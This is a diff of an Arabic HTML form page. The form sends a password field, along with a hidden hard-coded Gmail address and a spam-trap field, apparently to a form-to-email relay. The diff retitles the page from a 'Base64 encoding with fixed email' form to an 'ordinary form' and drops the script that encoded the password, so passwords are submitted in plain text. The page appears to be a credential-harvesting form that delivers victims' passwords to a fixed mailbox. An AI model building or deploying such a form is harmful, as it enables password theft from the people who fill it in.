@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>نموذج إرسال البيانات - تشفير Base64 مع بريد ثابت</title>
+  <title>نموذج عادية</title>
   <style>
     body {
       font-family: 'Arial';
@@ -51,11 +51,8 @@
     <!-- بريد إلكتروني مخفي وثابت -->
     <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">
 
-    <!-- كلمة المرور الأصلية -->
-    <input type="password" id="rawPassword" placeholder="كلمة المرور" required>
-
-    <!-- كلمة المرور المشفرة (Base64) -->
-    <input type="hidden" name="كلمة_المرور_المشفرة" id="encodedPassword">
+    <!-- كلمة المرور عادية -->
+    <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>
 
     <!-- منع سبام -->
     <input type="text" name="_honey" style="display:none">
@@ -65,17 +62,6 @@
 
     <button type="submit">إرسال</button>
   </form>
-
-  <script>
-    document.getElementById("formBase64").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const raw = document.getElementById("rawPassword").value;
-      const encoded = btoa(raw); // تشفير Base64
-      document.getElementById("encodedPassword").value = encoded;
-      document.getElementById("rawPassword").disabled = true; // منع الإرسال الأصلي
-      this.submit();
-    });
-  </script>
 
 </body>
 </html>
